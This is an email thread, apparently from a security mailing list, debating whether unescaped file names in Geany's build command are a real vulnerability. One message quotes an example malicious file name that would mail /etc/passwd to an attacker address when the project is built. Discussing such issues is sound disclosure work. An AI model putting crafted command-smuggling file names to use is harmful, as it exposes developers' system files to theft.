Hi Andreas,    I think it's unlikely to happen for one file. But what for project with (hundred, thousand of) small files?  Is the user prior building expected to investigate file name of each of them for sanity? This is where trust boundary is crossed - someone could send you a tarball: "Here is the source you were searching for." You would go to build it in Geany..  The difference when running it directly from the command line is that Bash would escape those files for you, so even with crafted names nothing bad / suspicious would happen (and project would build if syntactically correct).  To the difference, in the Geany scenario, the file name(s) would be passed to command line directly as they are (and if the project would build or not at the end isn't what matters here).  Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team  P.S.: Above based on my short playing with Geany. While original exploit       mentions just one file case, looks the same is possible for projects       (having multiple Makefiles).  ----- Original Message ----- On AM, Eitan Adler wrote: > On 12 December Jan Lieskovsky <jlieskov@...hat.com> wrote: >> The questions: >> 1) should Geany escape the filenames?, >  > Up to the maintainers. >  >> 2) is this a security issue or not? >  > Unlikely.

The way to get someone to trigger this is to send a source-file to a developer who then opens it in geany without realizing that the file is named "mail evil@...kdom.com -s teehee < /etc/passwd". The "attacked" developer then need to attempt to build it from geany's internal "build now" button.  A simpler misdeed of similar charactaristics would be to ship a bogus ./configure script that people (who are not developers, mind you) blindly run and which executes bogus commands on behalf of the logged in user.  Since the latter isn't really CVE-worthy, I doubt the former even comes close.  --  Andreas Ericsson                   andreas.ericsson@....se OP5 AB                             www.op5.se Tel: +46                  Fax: +46  Considering the successes of the wars on alcohol, poverty, drugs and terror, I think we should give some serious thought to declaring war on peace.
